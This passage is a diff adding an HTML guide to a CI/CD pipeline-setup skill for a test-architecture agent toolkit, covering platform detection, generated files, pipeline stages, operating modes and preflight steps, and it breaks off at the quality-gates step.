@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CI/CD Pipeline Setup — Guide</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,600;0,9..144,700;1,9..144,300;1,9..144,400;1,9..144,600;1,9..144,700&family=JetBrains+Mono:wght@400;500;700&family=Inter+Tight:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --ink:        #1a1612;
+    --ink-soft:   #4a3f35;
+    --ink-mute:   #8a7c6d;
+    --paper:      #f4ede0;
+    --paper-warm: #ebe1cf;
+    --rule:       #2a221a;
+    --accent:     #c2410c;
+    --accent-soft:#ea580c;
+    --highlight:  #facc15;
+    --code-bg:    #1a1612;
+    --code-fg:    #f4ede0;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { font-size: 16px; scroll-behavior: smooth; }
+  body { background: var(--paper); color: var(--ink); font-family: 'Inter Tight', sans-serif; line-height: 1.65; font-size: 0.9375rem; position: relative; }
+  body::before { content: ''; position: fixed; inset: 0; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events: none; z-index: 0; opacity: .5; }
+
+  .layout { display: grid; grid-template-columns: 300px minmax(0, 1fr); grid-template-rows: auto 1fr; grid-template-areas: "masthead masthead" "toc article"; max-width: 1340px; margin: 0 auto; min-height: 100vh; position: relative; z-index: 1; }
+
+  header.masthead { grid-area: masthead; border-bottom: 2px solid var(--rule); padding: 28px 40px 24px; background: var(--paper-warm); }
+  .masthead-top { display: flex; justify-content: space-between; align-items: center; font-family: 'JetBrains Mono', monospace; font-size: 10px; text-transform: uppercase; letter-spacing: 0.18em; color: var(--ink-mute); margin-bottom: 14px; flex-wrap: wrap; gap: 6px; }
+  .masthead-top .left { display: flex; gap: 20px; flex-wrap: wrap; }
+  .preview-badge { background: var(--accent); color: var(--paper); padding: 2px 10px; font-weight: 700; letter-spacing: 0.12em; }
+  h1.title { font-family: 'Fraunces', serif; font-size: clamp(1.8rem, 4vw, 2.9rem); font-weight: 700; letter-spacing: -0.025em; line-height: 1.1; color: var(--ink); margin-bottom: 8px; }
+  h1.title em { font-style: italic; font-weight: 300; color: var(--ink-soft); }
+  p.subtitle { font-size: 0.96rem; color: var(--ink-soft); max-width: 700px; line-height: 1.55; margin-bottom: 18px; }
+  dl.meta-grid { display: flex; flex-wrap: wrap; gap: 0; border: 1px solid var(--rule); border-right: none; }
+  dl.meta-grid > div { border-right: 1px solid var(--rule); padding: 8px 16px; min-width: 120px; }
+  dl.meta-grid dt { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--ink-mute); margin-bottom: 3px; }
+  dl.meta-grid dd { font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 700; color: var(--ink); }
+
+  /* ── Sidebar ──────────────────────────────────── */
+  aside.toc { grid-area: toc; border-right: 1px solid var(--rule); padding: 32px 0; position: sticky; top: 0; height: 100vh; overflow-y: auto; }
+  .toc-section-label { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.22em; color: var(--ink-mute); padding: 14px 24px 6px; border-bottom: 1px solid rgba(42,34,26,.12); margin-bottom: 6px; }
+  .toc-section-label:first-child { padding-top: 0; }
+  aside.toc nav a { display: block; padding: 5px 24px; font-size: 12.5px; color: var(--ink-soft); text-decoration: none; border-bottom: none; letter-spacing: -0.005em; }
+  aside.toc nav a.toc-sub { padding-left: 38px; font-size: 11.5px; color: var(--ink-mute); }
+  aside.toc nav a:hover { color: var(--accent); }
+
+  /* ── Article ──────────────────────────────────── */
+  main.article { grid-area: article; padding: 48px 56px 80px; }
+
+  /* ── Section headings ─────────────────────────── */
+  h2.agent-heading { font-family: 'Fraunces', serif; font-size: clamp(1.4rem, 2.5vw, 2rem); font-weight: 700; letter-spacing: -0.02em; color: var(--ink); margin-bottom: 20px; line-height: 1.15; display: flex; align-items: baseline; gap: 14px; flex-wrap: wrap; }
+  h2.agent-heading .marker { font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.18em; color: var(--paper); background: var(--ink); padding: 3px 10px; white-space: nowrap; flex-shrink: 0; align-self: center; }
+  h2.agent-heading .marker.why { background: var(--accent); }
+  h2.agent-heading .marker.how { background: #1d3557; }
+  h2.agent-heading em { font-style: italic; font-weight: 300; color: var(--ink-soft); }
+
+  h3.skill-heading { font-family: 'Fraunces', serif; font-size: 1.35rem; font-weight: 600; color: var(--ink); margin: 44px 0 16px; letter-spacing: -0.015em; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+  h3.skill-heading .code-name { font-family: 'JetBrains Mono', monospace; font-size: 13px; font-weight: 700; background: var(--ink); color: var(--paper); padding: 2px 10px; letter-spacing: 0.04em; vertical-align: 2px; white-space: nowrap; }
+  h3.skill-heading .code-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: 700; background: var(--accent); color: var(--paper); padding: 2px 8px; letter-spacing: 0.1em; text-transform: uppercase; white-space: nowrap; vertical-align: 2px; }
+
+  h4.step-heading { font-family: 'Fraunces', serif; font-size: 1.05rem; font-weight: 600; color: var(--ink); margin: 28px 0 10px; letter-spacing: -0.005em; display: flex; align-items: center; gap: 10px; }
+  h4.step-heading::before { content: ''; display: inline-block; width: 6px; height: 6px; background: var(--accent); flex-shrink: 0; transform: rotate(45deg); }
+
+  h5 { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); margin: 24px 0 8px; }
+
+  p { margin-bottom: 14px; line-height: 1.68; }
+  p.lede { font-size: 1.05rem; color: var(--ink-soft); font-style: italic; margin-bottom: 20px; }
+  code { font-family: 'JetBrains Mono', monospace; font-size: 0.83em; background: var(--paper-warm); border: 1px solid rgba(42,34,26,.2); padding: 1px 5px; color: var(--ink-soft); border-radius: 1px; }
+  pre { font-family: 'JetBrains Mono', monospace; font-size: 12px; background: var(--code-bg); color: var(--code-fg); padding: 16px 18px; overflow-x: auto; line-height: 1.6; margin: 0 0 18px; border: 1px solid var(--rule); }
+  pre code { background: none; border: none; padding: 0; color: inherit; font-size: inherit; }
+  a { color: var(--accent); text-decoration: none; border-bottom: 1px dotted var(--accent); }
+  a:hover { color: var(--accent-soft); }
+  strong { font-weight: 700; color: var(--ink); }
+  em { font-style: italic; }
+
+  /* ── Persona block ────────────────────────────── */
+  dl.persona-block { border: 1px solid var(--rule); background: var(--paper); margin: 0 0 28px; display: grid; grid-template-columns: 160px 1fr; }
+  dl.persona-block dt { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--ink-mute); padding: 9px 14px; border-bottom: 1px dotted rgba(42,34,26,.18); border-right: 1px solid rgba(42,34,26,.18); background: var(--paper-warm); vertical-align: top; }
+  dl.persona-block dd { font-size: 0.875rem; padding: 9px 14px; border-bottom: 1px dotted rgba(42,34,26,.18); color: var(--ink-soft); line-height: 1.5; }
+  dl.persona-block dt:last-of-type, dl.persona-block dd:last-child { border-bottom: none; }
+  .menu-codes { display: flex; flex-wrap: wrap; gap: 4px; }
+  .menu-codes code { background: var(--ink); color: var(--paper); border: none; font-size: 11px; font-weight: 700; padding: 2px 7px; }
+
+  /* ── Data callout ─────────────────────────────── */
+  .data-callout { margin: 20px 0 28px; border: 1px solid var(--rule); background: var(--paper-warm); }
+  .data-callout .data-head { display: flex; justify-content: space-between; align-items: baseline; padding: 10px 16px; border-bottom: 1px solid var(--rule); background: var(--ink); color: var(--paper); flex-wrap: wrap; gap: 8px; }
+  .data-callout .data-head .data-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; text-transform: uppercase; letter-spacing: 0.22em; color: var(--highlight); font-weight: 700; }
+  .data-callout .data-head .data-source { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--paper); opacity: 0.7; }
+  .data-callout table { width: 100%; border-collapse: collapse; font-size: 13px; line-height: 1.45; background: var(--paper); }
+  .data-callout th { text-align: left; padding: 8px 12px; font-family: 'JetBrains Mono', monospace; font-size: 9.5px; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); font-weight: 700; border-bottom: 2px solid var(--rule); background: var(--paper-warm); }
+  .data-callout td { padding: 9px 12px; border-bottom: 1px dotted rgba(26,22,18,.18); vertical-align: top; color: var(--ink); }
+  .data-callout tr:last-child td { border-bottom: none; }
+  .data-callout td.key-col { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; color: var(--accent); white-space: nowrap; }
+  .data-callout td ul { margin: 0; padding: 0 0 0 14px; font-size: 12px; color: var(--ink-soft); line-height: 1.6; }
+
+  /* ── Module grid ──────────────────────────────── */
+  .module-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 1px; border: 1px solid var(--rule); background: var(--paper); margin: 16px 0 32px; }
+  .module-card { background: var(--paper); padding: 16px 18px; box-shadow: 0 0 0 1px var(--rule); }
+  .module-card .card-code { font-family: 'JetBrains Mono', monospace; font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.18em; color: var(--accent); margin-bottom: 6px; }
+  .module-card .card-name { font-family: 'Fraunces', serif; font-size: 1.1rem; font-weight: 600; color: var(--ink); letter-spacing: -0.01em; margin-bottom: 10px; }
+  .module-card .card-body { font-size: 12.5px; color: var(--ink-soft); line-height: 1.55; }
+  .module-card .card-body ul { list-style: none; padding: 0; margin: 0; }
+  .module-card .card-body li { padding: 3px 0 3px 14px; position: relative; font-size: 12px; border-bottom: 1px dotted rgba(42,34,26,.12); }
+  .module-card .card-body li:last-child { border-bottom: none; }
+  .module-card .card-body li::before { content: '›'; position: absolute; left: 0; color: var(--accent); font-weight: 700; }
+  .module-card .card-footer { margin-top: 10px; padding-top: 8px; border-top: 1px dashed rgba(42,34,26,.2); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.12em; color: var(--ink-mute); }
+
+  /* ── Compare table ────────────────────────────── */
+  .compare-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 16px 0 28px; }
+  .compare-table th { padding: 10px 14px; text-align: left; font-family: 'JetBrains Mono', monospace; font-size: 9.5px; letter-spacing: 0.12em; text-transform: uppercase; }
+  .compare-table th:first-child { background: var(--ink); color: var(--paper); width: 20%; }
+  .compare-table th:nth-child(2) { background: #fee2e2; color: #991b1b; width: 40%; }
+  .compare-table th:nth-child(3) { background: #dcfce7; color: #166534; width: 40%; }
+  .compare-table td { padding: 9px 14px; border-bottom: 1px dotted rgba(42,34,26,.15); vertical-align: top; line-height: 1.5; font-size: 13px; }
+  .compare-table td:first-child { background: var(--paper-warm); font-weight: 600; font-size: 12px; color: var(--ink-soft); }
+  .compare-table td:nth-child(2) { background: var(--paper); color: var(--ink-mute); }
+  .compare-table td:nth-child(3) { background: var(--paper); color: var(--ink); }
+  .compare-table tr:last-child td { border-bottom: none; }
+
+  /* ── Security callout ─────────────────────────── */
+  .security-callout { border: 2px solid var(--accent); background: #fff7ed; padding: 16px 20px; margin: 20px 0 28px; }
+  .security-callout .sec-label { font-family: 'JetBrains Mono', monospace; font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.2em; color: var(--accent); margin-bottom: 8px; }
+  .security-callout p { margin: 0 0 8px; font-size: 0.875rem; color: var(--ink-soft); }
+  .security-callout p:last-child { margin: 0; }
+
+  /* ── Step detail / inline / checklist ─────────── */
+  ul.step-detail { list-style: none; margin: 0 0 18px; border: 1px solid rgba(42,34,26,.15); background: var(--paper); }
+  ul.step-detail li { padding: 9px 14px; border-bottom: 1px dotted rgba(42,34,26,.14); font-size: 0.9rem; line-height: 1.6; }
+  ul.step-detail li:last-child { border-bottom: none; }
+  ul.step-detail .label { font-family: 'JetBrains Mono', monospace; font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); display: inline-block; min-width: 110px; margin-right: 8px; }
+
+  ul.inline-list { list-style: none; margin: 0 0 16px; padding: 0; }
+  ul.inline-list li { padding: 4px 0 4px 18px; position: relative; font-size: 0.9rem; line-height: 1.55; color: var(--ink-soft); }
+  ul.inline-list li::before { content: '◆'; position: absolute; left: 0; top: 6px; font-size: 6px; color: var(--accent); }
+
+  ul.checklist { list-style: none; margin: 0 0 20px; padding: 0; }
+  ul.checklist li { padding: 6px 0 6px 24px; position: relative; font-size: 0.875rem; color: var(--ink-soft); border-bottom: 1px dotted rgba(42,34,26,.12); line-height: 1.5; }
+  ul.checklist li:last-child { border-bottom: none; }
+  ul.checklist li::before { content: '□'; position: absolute; left: 0; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--ink-mute); }
+
+  /* ── Performance grid ─────────────────────────── */
+  .perf-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; border: 1px solid var(--rule); background: var(--paper); margin: 16px 0 28px; }
+  .perf-grid > * { box-shadow: 0 0 0 1px var(--rule); }
+  .perf-card { background: var(--paper); padding: 14px 16px; text-align: center; }
+  .perf-card .perf-label { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; color: var(--ink-mute); margin-bottom: 6px; font-weight: 700; }
+  .perf-card .perf-value { font-family: 'Fraunces', serif; font-size: 1.4rem; font-weight: 700; color: var(--accent); line-height: 1; margin-bottom: 4px; }
+  .perf-card .perf-desc { font-size: 11px; color: var(--ink-mute); }
+
+  /* ── Section divider ──────────────────────────── */
+  hr.section-divider { border: none; border-top: 1px solid var(--rule); margin: 56px 0; position: relative; text-align: center; }
+  hr.section-divider::after { content: '◆ ◆ ◆'; position: absolute; top: -9px; left: 50%; transform: translateX(-50%); background: var(--paper); padding: 0 12px; font-size: 8px; color: var(--ink-mute); letter-spacing: 6px; }
+
+  footer.colophon { grid-column: 1 / -1; border-top: 2px solid var(--rule); padding: 20px 40px; background: var(--paper-warm); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px; text-transform: uppercase; letter-spacing: 0.14em; color: var(--ink-mute); }
+  footer.colophon strong { color: var(--accent); }
+
+  @media (max-width: 900px) {
+    .layout { grid-template-columns: 1fr; grid-template-areas: "masthead" "article"; }
+    aside.toc { display: none; }
+    main.article { padding: 32px 24px 60px; }
+    .module-grid { grid-template-columns: 1fr; }
+    .perf-grid { grid-template-columns: repeat(2, 1fr); }
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+
+  <!-- MASTHEAD -->
+  <header class="masthead">
+    <div class="masthead-top">
+      <div class="left">
+        <span>BMad TEA · Test Architecture Enterprise</span>
+        <span>Skill · bmad-testarch-ci</span>
+        <span>Module · tea-skills</span>
+      </div>
+      <div class="right"><span class="preview-badge">Full Guide</span></div>
+    </div>
+    <h1 class="title">CI/CD Pipeline Setup <em>· Master Architect</em></h1>
+    <p class="subtitle">Scaffold a production-ready CI quality pipeline with parallel sharding, burn-in flaky detection, artifact collection, and quality gates — for GitHub Actions, GitLab CI, Jenkins, Azure DevOps, Harness, or Circle CI.</p>
+    <dl class="meta-grid">
+      <div><dt>Skill code</dt><dd>bmad-testarch-ci</dd></div>
+      <div><dt>Menu code</dt><dd>CI</dd></div>
+      <div><dt>Input</dt><dd>Project stack/framework + CI platform choice</dd></div>
+      <div><dt>Trigger</dt><dd>"lets setup CI pipeline" / "I want to create quality gates"</dd></div>
+      <div><dt>Agent</dt><dd>Murat (Test Architect)</dd></div>
+      <div><dt>Platforms</dt><dd>6 supported</dd></div>
+      <div><dt>Stacks</dt><dd>Frontend · Backend · Fullstack</dd></div>
+      <div><dt>Steps (C)</dt><dd>4 + 1 resume</dd></div>
+      <div><dt>Autonomous</dt><dd>Yes · minimal prompts</dd></div>
+    </dl>
+  </header>
+
+  <!-- TOC -->
+  <aside class="toc">
+    <nav>
+      <div class="toc-section-label">§ WHAT</div>
+      <a href="#what-overview">Skill Overview</a>
+      <a href="#platforms">CI Platform Support</a>
+      <a href="#platform-table" class="toc-sub">6 Platforms &amp; Output Paths</a>
+      <a href="#platform-detect" class="toc-sub">Auto-Detection Logic</a>
+
+      <div class="toc-section-label">§ WHY</div>
+      <a href="#why-ci">Why CI/CD Pipeline?</a>
+      <a href="#when-to-use">When to Use</a>
+
+      <div class="toc-section-label">§ HOW</div>
+      <a href="#activation">Activation &amp; Modes (C/R/V/E)</a>
+      <a href="#steps-c">Workflow Steps (4 Steps)</a>
+      <a href="#steps-e" class="toc-sub">Edit Mode</a>
+      <a href="#steps-v" class="toc-sub">Validate Mode</a>
+      <a href="#pipeline-stages">Pipeline Stages</a>
+      <a href="#sharding" class="toc-sub">Parallel Sharding</a>
+      <a href="#burn-in" class="toc-sub">Burn-In Loop</a>
+      <a href="#contract" class="toc-sub">Contract Testing Stage</a>
+      <a href="#caching" class="toc-sub">Dependency Caching</a>
+      <a href="#artifacts" class="toc-sub">Artifact Collection</a>
+      <a href="#quality-gates">Quality Gates</a>
+      <a href="#security">Security — Injection Prevention</a>
+      <a href="#generated-files">Generated Files</a>
+      <a href="#performance">Performance Targets</a>
+      <a href="#checklist">Key Checklist Items</a>
+      <a href="#post">Post-Setup Actions</a>
+    </nav>
+  </aside>
+
+  <!-- ARTICLE -->
+  <main class="article">
+
+    <!-- ══════════════════════════════════════════════
+         § WHAT
+         ══════════════════════════════════════════════ -->
+    <section id="what-overview">
+      <h2 class="agent-heading">
+        <span class="marker">§ WHAT</span>
+        CI/CD Pipeline Setup — <em>What does this Skill do?</em>
+      </h2>
+
+      <p>Every time a developer pushes code, someone needs to run tests and report back. Without CI, that someone is you — manually. <strong>CI (Continuous Integration)</strong> automates that job: the moment code is pushed, a server wakes up, runs all tests, and reports pass or fail — no human intervention needed.</p>
+
+      <pre>Developer pushes code
+        ↓
+CI server picks it up automatically
+        ↓
+lint → test → burn-in → report
+        ↓                  ↓
+   PASS → merge allowed   FAIL → blocked + notification sent</pre>
+
+      <p>This skill generates the <strong>CI configuration file</strong> that defines that entire flow — what runs, when, how fast, and what happens on failure. The output is one file (e.g. <code>.github/workflows/test.yml</code>) that you commit and push. From that point forward, every PR is tested automatically.</p>
+
+      <dl class="persona-block">
+        <dt>Skill code</dt><dd><code>bmad-testarch-ci</code></dd>
+        <dt>Menu trigger</dt><dd><code>CI</code> — say "lets setup CI pipeline" or "I want to create quality gates"</dd>
+        <dt>Role</dt><dd>Master Test Architect — generates a production-ready CI pipeline so the team never has to manually trigger tests again.</dd>
+        <dt>Prerequisite</dt><dd>Local test framework must be ready first (<code>bmad-testarch-framework</code>). Local tests must pass — the skill HALTS at step-01 if they fail. Fix tests first, then run CI setup.</dd>
+        <dt>Distinct from</dt><dd><code>bmad-testarch-framework</code> sets up <em>how</em> tests run on your machine. This skill puts those tests into a <em>CI pipeline</em> so they run automatically on every PR.</dd>
+      </dl>
+
+      <h4 class="step-heading" id="platform-table">Supported CI Platforms</h4>
+      <p>The skill detects which platform the project uses and generates the correct config file format. Six platforms are supported:</p>
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Platform → Output File</span>
+          <span class="data-source">step-02-generate-pipeline.md</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>Platform</th><th>Config file created</th><th>Default?</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="key-col">GitHub Actions</td><td><code>.github/workflows/test.yml</code></td><td>Yes — fallback if platform cannot be detected</td></tr>
+            <tr><td class="key-col">GitLab CI</td><td><code>.gitlab-ci.yml</code></td><td>—</td></tr>
+            <tr><td class="key-col">Jenkins</td><td><code>Jenkinsfile</code></td><td>—</td></tr>
+            <tr><td class="key-col">Azure DevOps</td><td><code>azure-pipelines.yml</code></td><td>—</td></tr>
+            <tr><td class="key-col">Harness</td><td><code>.harness/pipeline.yaml</code></td><td>—</td></tr>
+            <tr><td class="key-col">Circle CI</td><td><code>.circleci/config.yml</code></td><td>Generated from scratch — no template</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4 class="step-heading" id="platform-detect">How Platform is Detected</h4>
+      <ul class="step-detail">
+        <li><strong class="label">1. Config file</strong>If <code>ci_platform</code> is explicitly set in <code>config.yaml</code>, use it — no detection needed.</li>
+        <li><strong class="label">2. Existing files</strong>Scan the repo for existing CI config files. If found, ask: update or replace?</li>
+        <li><strong class="label">3. Git remote URL</strong><code>github.com</code> → GitHub Actions · <code>gitlab.com</code> → GitLab CI</li>
+        <li><strong class="label">4. Default</strong>If still unresolved → GitHub Actions.</li>
+      </ul>
+
+      <h4 class="step-heading">What Gets Generated</h4>
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Output Files</span>
+          <span class="data-source">checklist.md · step-04</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>File</th><th>Purpose</th><th>When created</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="key-col">CI config file</td><td>The pipeline definition — tells CI what to run, in what order, on what triggers</td><td>Always</td></tr>
+            <tr><td class="key-col"><code>scripts/ci-local.sh</code></td><td>Mirrors the CI environment on your machine — debug CI failures without pushing</td><td>Always</td></tr>
+            <tr><td class="key-col"><code>scripts/test-changed.sh</code></td><td>Runs only tests affected by changed files — useful for large test suites</td><td>Always</td></tr>
+            <tr><td class="key-col"><code>scripts/burn-in.sh</code></td><td>Run flaky detection loop locally before pushing a PR</td><td>Frontend / Fullstack only</td></tr>
+            <tr><td class="key-col"><code>docs/ci.md</code></td><td>Pipeline guide — stages explained, trigger conditions, troubleshooting tips</td><td>Always</td></tr>
+            <tr><td class="key-col"><code>docs/ci-secrets-checklist.md</code></td><td>Every required CI secret listed with step-by-step setup instructions per platform</td><td>Always</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- ══════════════════════════════════════════════
+         § WHY
+         ══════════════════════════════════════════════ -->
+    <section id="why-ci">
+      <h2 class="agent-heading">
+        <span class="marker why">§ WHY</span>
+        Why CI/CD Pipeline Setup?
+      </h2>
+
+      <p class="lede">Tests that only run locally give false confidence. Without CI, a developer merges code that "worked on my machine" — and breaks production. CI is the enforcement layer that makes test results mean something.</p>
+
+      <p>Without CI, quality depends on individuals remembering to run tests. With CI, quality is enforced structurally — code cannot be merged unless tests pass. Here is the full comparison:</p>
+
+      <table class="compare-table">
+        <thead>
+          <tr>
+            <th>Problem</th>
+            <th>Without CI Pipeline</th>
+            <th>With CI Pipeline (this skill)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Test reliability</td>
+            <td>Tests pass locally, fail in CI due to environment differences — wrong Node version, browser not installed, missing dependency</td>
+            <td>Pinned language versions, identical runner environment every run. <code>scripts/ci-local.sh</code> lets you mirror CI on your machine</td>
+          </tr>
+          <tr>
+            <td>Flaky tests</td>
+            <td>Flaky tests pass most of the time, fail randomly — blame falls on "environment" and the team lives with it</td>
+            <td>Burn-in loop runs tests 10× on every PR — flaky tests surface and block merge before they reach main</td>
+          </tr>
+          <tr>
+            <td>Test speed</td>
+            <td>Single sequential run: 200 tests = 30–60 minutes. Developers wait, skip tests, or push without testing</td>
+            <td>Parallel sharding across 4 runners: 200 tests in under 10 min/shard, full pipeline under 45 minutes</td>
+          </tr>
+          <tr>
+            <td>Security</td>
+            <td>Ad-hoc CI scripts; PR titles and issue bodies can inject shell commands via <code>${{ github.event.* }}</code></td>
+            <td>All user-controlled inputs routed through <code>env:</code> intermediaries — no direct expression injection allowed</td>
+          </tr>
+          <tr>
+            <td>API contract breaks</td>
+            <td>Frontend and backend tested independently — a breaking API change is discovered after deploy</td>
+            <td><code>can-i-deploy</code> gate blocks deployment automatically if consumer/provider contracts are incompatible</td>
+          </tr>
+          <tr>
+            <td>Debugging failures</td>
+            <td>Pipeline fails with no evidence — reproduce locally blind, add print statements, push again</td>
+            <td>Artifacts uploaded on failure: HTML report, traces, videos, JUnit XML — debug from CI without touching code</td>
+          </tr>
+          <tr>
+            <td>Release evidence</td>
+            <td>"Tests passed" in a Slack message — no audit trail, no structured gate output</td>
+            <td>Quality gates enforced: P0 = 100%, P1 ≥ 95%. Structured pass/fail output per PR, ready for audit</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <hr class="section-divider">
+
+    <section id="when-to-use">
+      <h3 class="skill-heading">
+        <span class="code-name">when-to-use</span>
+        When to Use This Skill
+      </h3>
+      <ul class="step-detail">
+        <li><strong class="label">Trigger phrases</strong>"lets setup CI pipeline" · "I want to setup CI" · "I want to create quality gates" · "setup GitHub Actions"</li>
+        <li><strong class="label">Timing</strong>After <code>bmad-testarch-framework</code> (TF) is complete and local tests pass. One-time setup per repo — then use Edit or Validate mode as the project evolves.</li>
+        <li><strong class="label">Hard prerequisite</strong>Local tests must pass. If they fail, the skill HALTS at step-01: <em>"Fix failing tests before CI setup."</em> There is no bypass.</li>
+      </ul>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- ══════════════════════════════════════════════
+         § HOW
+         ══════════════════════════════════════════════ -->
+    <section id="activation">
+      <h2 class="agent-heading">
+        <span class="marker how">§ HOW</span>
+        How to Run This Skill
+      </h2>
+
+      <p>When you trigger the skill, it asks which mode you want. There are four:</p>
+
+      <div class="data-callout">
+        <div class="data-head">
+          <span class="data-label">Four Operating Modes</span>
+          <span class="data-source">SKILL.md</span>
+        </div>
+        <table>
+          <thead>
+            <tr><th>Key</th><th>Mode</th><th>Use when</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="key-col"><code>C</code></td>
+              <td><strong>Create</strong></td>
+              <td>Setting up CI for the first time — runs all 4 steps from scratch</td>
+            </tr>
+            <tr>
+              <td class="key-col"><code>R</code></td>
+              <td><strong>Resume</strong></td>
+              <td>CI setup was interrupted mid-way — picks up from the last completed step automatically</td>
+            </tr>
+            <tr>
+              <td class="key-col"><code>V</code></td>
+              <td><strong>Validate</strong></td>
+              <td>Audit an existing CI config against the full checklist — produces a PASS/WARN/FAIL report</td>
+            </tr>
+            <tr>
+              <td class="key-col"><code>E</code></td>
+              <td><strong>Edit</strong></td>
+              <td>Update a specific section of the existing CI config (e.g. add a new stage, change shard count)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <hr class="section-divider">
+
+    <!-- Workflow Steps -->
+    <section id="steps-c">
+      <h3 class="skill-heading">
+        <span class="code-name">steps-c</span>
+        Create Mode — 4 Steps
+        <span class="code-tag">primary</span>
+      </h3>
+
+      <h4 class="step-heading">step-01 · Preflight Checks</h4>
+      <p>Before generating anything, the skill verifies the project is actually ready. If any check fails, it stops immediately and tells you what to fix.</p>
+      <ul class="step-detail">
+        <li><strong class="label">File</strong><code>steps-c/step-01-preflight.md</code></li>
+        <li><strong class="label">Git check</strong>Verifies <code>.git/</code> exists. CI requires git — HALT if missing.</li>
+        <li><strong class="label">Stack detect</strong>Scans the project for frontend clues (<code>playwright.config.*</code>, <code>next.config.*</code>, <code>src/components/</code>) and backend clues (<code>pyproject.toml</code>, <code>pom.xml</code>, <code>go.mod</code>, <code>Dockerfile</code>). Both present → fullstack. Result determines which test commands and which pipeline template to use.</li>
+        <li><strong class="label">Framework check</strong>Verifies a test framework config exists for the detected stack. HALT if missing — "Run <code>framework</code> workflow first."</li>
+        <li><strong class="label">Local test run</strong>Actually runs your tests: <code>npm test</code>, <code>pytest</code>, <code>go test ./...</code>, etc. HALT if any test fails — CI should run green tests, not broken ones.</li>
+        <li><strong class="label">CI detect</strong>Finds which CI platform to target (see platform detection above).</li>
+        <li><strong class="label">Env context</strong>Reads your language version file (<code>.nvmrc</code>, <code>.python-version</code>, <code>go.mod</code>) so the generated CI config pins the exact same version you use locally.</li>
+        <li><strong class="label">Output</strong>Saves detected stack type, platform, and env context to <code>ci-pipeline-progress.md</code> — used by Resume mode if interrupted.</li>
+      </ul>
+
+      <h4 class="step-heading">step-02 · Generate the CI Pipeline</h4>
+      <p>This is the main step — it produces the actual CI config file with all stages wired up. The skill picks the right platform template, fills it in based on your stack, and writes it to the correct path.</p>
+      <ul class="step-detail">
+        <li><strong class="label">File</strong><code>steps-c/step-02-generate-pipeline.md</code></li>
+        <li><strong class="label">Template selection</strong>Each platform has a pre-built template. The skill fills it in based on your <code>test_stack_type</code> and <code>test_framework</code>. Circle CI has no template — generated from first principles.</li>
+        <li><strong class="label">Stages generated</strong><code>lint</code> → <code>test</code> (parallel shards) → <code>contract-test</code> (if Pact is enabled) → <code>burn-in</code> → <code>report</code></li>
+        <li><strong class="label">Stack-conditional</strong>Frontend/Fullstack: includes browser install step. Backend: skips browser install, uses language-specific commands (<code>pytest</code>, <code>go test</code>, etc.).</li>
+        <li><strong class="label">Security baked in</strong>All user-controlled CI inputs are automatically routed through <code>env:</code> intermediaries — the generated YAML cannot be exploited via PR title injection.</li>
+        <li><strong class="label">Dependency caching</strong>Each language has its own cache strategy so CI does not re-download packages on every run (saves 2–5 min per run).</li>
+      </ul>
+
+      <h4 class="step-heading">step-03 · Configure Quality Gates &amp; Notifications</h4>
